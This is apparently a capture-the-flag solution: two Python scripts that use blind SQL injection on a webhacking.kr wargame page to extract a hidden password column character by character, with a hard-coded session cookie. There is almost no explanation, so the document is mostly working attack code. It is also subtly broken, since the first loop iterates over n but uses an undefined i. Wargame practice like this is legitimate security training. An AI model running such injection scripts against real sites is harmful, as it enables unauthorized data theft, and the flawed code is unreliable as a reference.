import requests
 
url = "http://webhacking.kr/challenge/web/web-31/rank.php" 
headers = {'Cookie': 'PHPSESSID=95e4cp4uvtu9kcs4dk3ln7s6ggf'}
flag = '' 

for n in range(0,100):
    query = "?score=2147483647 and length(p4ssw0rd_1123581321)={} #".format(i)
    r = requests.get(url+query, headers=headers)
    if r.text.find('id : jusb3 // 2147483647') != -1:
      flag_length = i
      print("flag_length is ", flag_length)
      break

for i in range(1, flag_length + 1):
  for j in range(33, 127):
    query = "?score=2147483647 and ord(right(left(p4ssw0rd_1123581321,{}),1))={} #".format(i, j)
    r = requests.get(url+query, headers=headers)
    if r.text.find('id : jusb3 // 2147483647') != -1:
      flag += chr(j)
      print("flag({}) : {}".format(i, chr(j)))
      break

print("flag is", flag)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

import requests
 
url = "http://webhacking.kr/challenge/web/web-31/rank.php" 
headers = {'Cookie': 'PHPSESSID=95e4cp4uvtu9kcs4dk3ln7s6ggf'}
flag = '' 
flag_length = 31


for i in range(1, flag_length + 1):
  for j in range(33, 127):
    query = "?score=2147483647 and ord(right(left(p4ssw0rd_1123581321,{}),1))={} #".format(i, j)
    r = requests.get(url+query, headers=headers)
    if r.text.find('id : jusb3 // 2147483647') != -1:
      flag += chr(j)
      print("flag({}) : {}".format(i, chr(j)))
      break

print("flag is", flag)


FLAG{easy...}
